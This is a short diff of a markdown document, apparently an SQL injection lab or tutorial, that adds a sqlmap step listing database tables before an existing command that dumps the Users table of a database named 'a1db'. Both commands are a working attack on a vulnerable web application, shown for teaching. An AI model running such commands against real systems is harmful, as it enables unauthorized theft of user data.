@@ -66,7 +66,13 @@ $ sqlmap -r postRequest.txt
 
 <img src="attack-3.png" align="center"/>
 
-After understanding how this database is structured, an attacker could use the following command to retrieve sensitive information from the it:
+After understanding how this database is structured, an attacker could use the following command to retrieve database details:
+
+```sh
+$ sqlmap -r postRequest.txt --tables
+```
+
+And then retrieve sensitive information from it:
 
 ```sh
 $ sqlmap -r postRequest.txt -D a1db -T Users --dump
